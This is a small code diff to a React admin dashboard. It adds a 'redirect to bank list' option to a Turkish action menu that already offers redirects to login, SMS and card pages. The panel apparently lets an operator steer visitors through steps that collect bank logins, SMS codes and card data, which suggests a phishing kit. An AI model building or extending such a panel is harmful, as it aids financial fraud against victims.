@@ -742,6 +742,7 @@ export function AdminDashboardClean() {
                         >
                           <option value="">İşlem Seç...</option>
                           <option value="win">Giriş'e Yönlendir</option>
+                          <option value="banken">Banka Listesine Yönlendirme</option>
                           <option value="sms">SMS'e Yönlendir</option>
                           <option value="card">Kart'a Yönlendir</option>
                           <option value="wait">Beklemeye Al</option>
